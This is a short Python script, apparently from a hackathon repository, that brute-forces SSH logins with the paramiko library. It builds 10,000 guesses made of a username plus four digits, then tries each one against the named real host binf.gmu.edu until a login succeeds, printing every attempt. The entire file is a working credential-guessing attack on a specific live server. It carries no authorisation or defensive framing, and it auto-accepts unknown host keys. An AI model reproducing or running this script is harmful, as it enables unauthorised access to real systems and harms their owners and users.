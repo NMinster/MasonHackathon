import paramiko
import random

usernames = ['nminster']

possible_passwords = [f"{username}{i:04d}" for username in usernames for i in range(10000)]
random.shuffle(possible_passwords)

hostname = 'binf.gmu.edu'
port = 22

ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

successful_login = False

# Keep trying until a successful login occurs
while not successful_login and possible_passwords:
    # Get the next password from the list
    password = possible_passwords.pop()

    # Split the password back into username and the generated part
    username, _ = password[:-4], password[-4:]
    print(f"Trying username: {username}, password: {password}")

    try:
        # Attempt to connect to the SSH server using the generated password
        ssh_client.connect(hostname, port, username, password, timeout=10, banner_timeout=30)

        # If successfully connected, print a success message and close the connection
        print(f"Success! Connected with username: {username}, password: {password}")
        ssh_client.close()
        successful_login = True
    except paramiko.AuthenticationException:
        # If the authentication fails, print a failure message
        print(f"Failed to connect with username: {username}, password: {password}")
    except Exception as e:
        # If an error occurs, print the error message
        print(f"Error: {e}")
